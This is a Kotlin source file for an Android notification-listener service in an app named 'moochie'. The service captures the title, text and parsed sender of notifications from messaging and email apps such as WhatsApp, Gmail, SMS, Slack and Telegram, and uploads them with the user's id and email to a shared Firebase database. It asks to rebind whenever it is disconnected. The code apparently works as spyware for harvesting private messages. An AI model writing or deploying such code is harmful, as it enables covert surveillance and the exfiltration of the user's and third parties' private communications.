package com.cute.moochie.service

import android.app.Notification
import android.content.ComponentName
import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.cute.moochie.data.AuthManager
import com.cute.moochie.data.NotificationData
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class MoochieNotificationListenerService : NotificationListenerService() {
    
    private lateinit var authManager: AuthManager
    private val firebaseDatabase by lazy { FirebaseDatabase.getInstance() }
    
    companion object {
        private const val TAG = "NotificationListener"
        const val ACTION_NOTIFICATION_LISTENER_STARTED = "com.cute.moochie.NOTIFICATION_LISTENER_STARTED"
        private val EXCLUDED_TITLES = listOf("Chat heads active", "Updating your shared location…", "Choose input method", "")
        
        // For verifying the service is running
        var isRunning = false
            private set
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Notification listener service onCreate called")
        authManager = AuthManager(this)
        isRunning = true
        
        // Configure database reference
        val notificationsRef = firebaseDatabase.getReference("notifications")
        notificationsRef.keepSynced(true)
        
        // Notify the app that the service has started
        sendBroadcast(Intent(ACTION_NOTIFICATION_LISTENER_STARTED))
        Log.d(TAG, "Notification listener service created and running")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Notification listener service onDestroy called")
        isRunning = false
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected to system")
        isRunning = true
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "Notification listener disconnected from system")
        
        // Attempt to reconnect
        requestRebind(ComponentName(this, MoochieNotificationListenerService::class.java))
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Log.d(TAG, "Notification posted from: ${sbn.packageName}")
        
        try {
            // Check if user is logged in - we still need to know this to attribute the notification source
            val userId = authManager.getUserId()
            val userEmail = authManager.getUserEmail()
            
            if (userId == null) {
                Log.d(TAG, "User not logged in, skipping notification tracking")
                return
            }
            
            // Get notification details
            val notification = sbn.notification
            val extras = notification.extras
            
            // Get notification content
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val appName = getApplicationLabel(sbn.packageName)
            
            Log.d(TAG, "Processing notification - App: $appName, Title: $title")
            
            // Skip our own app's notifications
            if (sbn.packageName == packageName) {
                Log.d(TAG, "Skipping our own app notification")
                return
            }
            
            // Skip excluded notification titles
            if (title in EXCLUDED_TITLES) {
                Log.d(TAG, "Skipping excluded notification: $title")
                return
            }
            
            // Extract sender information based on app
            var senderInfo = extractSenderInfo(sbn.packageName, title, text)
            
            // For Gmail, add the logged in user's email to the sender information
            if (sbn.packageName == "com.google.android.gm" && userEmail != null) {
                senderInfo = "From: $userEmail - $senderInfo"
            }
            
            Log.d(TAG, "Extracted sender info: $senderInfo")
            
            // Create notification data object
            val notificationData = NotificationData(
                packageName = sbn.packageName,
                appName = appName,
                title = title,
                content = text,
                postTime = sbn.postTime,
                formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date(sbn.postTime)),
                userId = userId,
                senderInfo = senderInfo
            )
            
            // Save to Firebase Realtime Database - now saving regardless of user match
            saveNotificationToFirebase(notificationData)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }
    
    private fun getApplicationLabel(packageName: String): String {
        try {
            val packageManager = applicationContext.packageManager
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            return packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting app name for $packageName", e)
            return packageName
        }
    }
    
    private fun saveNotificationToFirebase(notificationData: NotificationData) {
        val notificationsRef = firebaseDatabase.getReference("notifications")
        val newNotificationRef = notificationsRef.push()
        
        Log.d(TAG, "Saving notification to Firebase: ${notificationData.title} (${notificationData.appName})")
        
        newNotificationRef.setValue(notificationData)
            .addOnSuccessListener {
                Log.d(TAG, "Successfully saved notification to Firebase")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error saving notification to Firebase: ${e.message}", e)
            }
    }
    
    /**
     * Extracts sender information based on the app package name
     */
    private fun extractSenderInfo(packageName: String, title: String, content: String): String {
        return when (packageName) {
            "com.google.android.gm" -> extractGmailSender(title, content)
            "com.whatsapp" -> extractWhatsAppSender(title, content)
            "com.facebook.katana", "com.facebook.orca" -> extractFacebookSender(title, content)
            "com.twitter.android" -> extractTwitterSender(title, content)
            "com.instagram.android" -> extractInstagramSender(title, content)
            "com.linkedin.android" -> extractLinkedInSender(title, content)
            "com.google.android.apps.messaging" -> extractAndroidMessagesSender(title, content)
            "com.microsoft.office.outlook" -> extractOutlookSender(title, content)
            "com.slack" -> extractSlackSender(title, content)
            "org.telegram.messenger" -> extractTelegramSender(title, content)
            else -> ""
        }
    }
    
    private fun extractWhatsAppSender(title: String, content: String): String {
        // WhatsApp usually has the sender name as the title
        // Group messages have format "Sender @ Group"
        if (title.contains(" @ ")) {
            val parts = title.split(" @ ")
            if (parts.size >= 2) {
                return "${parts[0]} (${parts[1]})"
            }
        }
        return title
    }
    
    private fun extractFacebookSender(title: String, content: String): String {
        // Facebook Messenger typically has sender name in title
        return title
    }
    
    private fun extractTwitterSender(title: String, content: String): String {
        // Twitter notifications often have format "User: Tweet content"
        val colonPattern = "(.+):".toRegex()
        colonPattern.find(title)?.let { match ->
            return match.groupValues[1].trim()
        }
        return title
    }
    
    private fun extractInstagramSender(title: String, content: String): String {
        // Instagram often has the username in title
        return title
    }
    
    private fun extractLinkedInSender(title: String, content: String): String {
        // LinkedIn often has the connection name in title
        return title
    }
    
    private fun extractAndroidMessagesSender(title: String, content: String): String {
        // Android Messages uses the contact name or phone number as title
        return title
    }
    
    private fun extractOutlookSender(title: String, content: String): String {
        // Outlook may have "User - Subject" format
        val dashPattern = "(.+) - ".toRegex()
        dashPattern.find(title)?.let { match ->
            return match.groupValues[1].trim()
        }
        
        // Or look for email pattern in content
        val emailPattern = "([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})".toRegex()
        emailPattern.find(content)?.let { match ->
            return match.groupValues[1].trim()
        }
        
        return title
    }
    
    private fun extractSlackSender(title: String, content: String): String {
        // Slack format is often "User in Channel" or just "Channel"
        if (title.contains(" in ")) {
            val parts = title.split(" in ")
            if (parts.size >= 2) {
                return "${parts[0]} (${parts[1]})"
            }
        }
        return title
    }
    
    private fun extractTelegramSender(title: String, content: String): String {
        // Telegram uses the contact or group name as title
        return title
    }
    
    /**
     * Extracts the sender's email address or name from Gmail notifications
     */
    private fun extractGmailSender(title: String, content: String): String {
        // Try several patterns to extract sender information
        
        // Pattern 1: Some Gmail notifications have format "Sender Name - Subject"
        val dashPattern = "(.+) - ".toRegex()
        dashPattern.find(title)?.let { match ->
            return match.groupValues[1].trim()
        }
        
        // Pattern 2: Some notifications have format "new messages from X" in content
        val fromPattern = "(?:new messages from|message from) (.+)".toRegex(RegexOption.IGNORE_CASE)
        fromPattern.find(content)?.let { match ->
            return match.groupValues[1].trim()
        }
        
        // Pattern 3: Look for email address pattern in the content
        val emailPattern = "([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})".toRegex()
        emailPattern.find(content)?.let { match ->
            return match.groupValues[1].trim()
        }
        
        // Pattern 4: Check for format "X, Y, and 5 more"
        val multipleEmailsPattern = "(.+), (.+), and (\\d+) more".toRegex()
        multipleEmailsPattern.find(title)?.let { match ->
            return "${match.groupValues[1]}, ${match.groupValues[2]}, and ${match.groupValues[3]} more"
        }
        
        // If no pattern matches, use title as fallback if it seems like a sender name
        if (title.contains("@") || !title.contains(" - ")) {
            return title
        }
        
        return ""
    }
} 